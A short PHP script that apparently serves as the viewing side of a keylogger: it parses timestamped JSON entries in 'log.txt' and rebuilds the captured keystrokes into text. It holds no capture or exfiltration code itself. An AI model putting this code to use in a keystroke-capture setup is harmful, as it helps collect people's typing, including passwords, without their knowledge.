<?php

// Show logged data:

$file = 'log.txt';
if (file_exists($file)) {
    $fileContent = file_get_contents($file);

    $logs = explode("\n", trim($fileContent));

    $txtToPrint = "";

    foreach ($logs as $log) {
        if (preg_match('/\[(.*?)\] (.*)/', $log, $matches)) {
            $jsonData = $matches[2];

            $keyLogs = json_decode($jsonData, true);

            foreach ($keyLogs as $keyLog) {
                $txtToPrint .= $keyLog['k'];
            }
            $txtToPrint .= "\n";
        }
    }

    echo "Stored txt: " . $txtToPrint;
}